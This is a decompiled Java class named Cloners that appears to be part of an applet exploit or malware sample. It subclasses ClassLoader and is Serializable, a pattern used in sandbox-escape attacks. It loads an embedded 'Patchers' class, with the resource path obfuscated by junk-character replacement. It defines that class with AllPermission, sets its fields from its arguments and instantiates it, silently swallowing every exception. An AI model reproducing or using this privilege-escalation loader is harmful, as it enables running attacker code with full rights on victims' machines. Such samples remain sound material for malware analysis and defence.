// 
// Decompiled by Procyon v0.5.30
// 

package lorry;

import java.security.Permission;
import java.security.AllPermission;
import java.security.PermissionCollection;
import java.security.ProtectionDomain;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.cert.Certificate;
import java.net.URL;
import java.lang.reflect.Field;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.io.Serializable;

public class Cloners extends ClassLoader implements Serializable
{
    public static Cloners instance;
    private static final long serialVersionUID = 6812622870313961944L;
    
    private void writeObject(final ObjectOutputStream objectOutputStream) throws IOException, ClassNotFoundException {
        objectOutputStream.defaultWriteObject();
    }
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        Cloners.instance = this;
        objectInputStream.defaultReadObject();
    }
    
    public void __n(final String s, final String s2) throws IOException {
        final int n = 8192;
        try {
            final ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            final byte[] array = new byte[n];
            int read;
            while ((read = this.getClass().getResourceAsStream("/".replace("`", "") + "hlohrry".replace("h", "").replace("TTTT.TTTT".replace("T", ""), "/".replace("o", "")) + "/7777P77777a7tche7r777s77.77cl7777a7s777s".replace("7", "")).read(array)) > 0) {
                byteArrayOutputStream.write(array, 0, read);
            }
            final Class minitClass = this.minitClass(byteArrayOutputStream.toByteArray());
            if (minitClass != null) {
                final Field field = minitClass.getField("cch".replace("h", ""));
                final Field field2 = minitClass.getField("QQdatQQQQQQa".replace("Q", ""));
                final Object instance = minitClass.newInstance();
                field.set(instance, s2);
                field2.set(instance, s);
                minitClass.newInstance();
            }
        }
        catch (Exception ex) {}
    }
    
    public Class minitClass(final byte[] array) throws IOException {
        final int n = 0;
        final URL url = new URL("fi>le>>>:>>>>/>/>>/".replace(">", ""));
        final Certificate[] array2 = new Certificate[n];
        final Permissions permissions = new Permissions();
        this.AddPerm(permissions);
        return this.defineClass("lorry.Patchers", array, n, array.length, new ProtectionDomain(new CodeSource(url, array2), permissions));
    }
    
    public void AddPerm(final Permissions permissions) {
        permissions.add(new AllPermission());
    }
    
    static {
        Cloners.instance = null;
    }
}
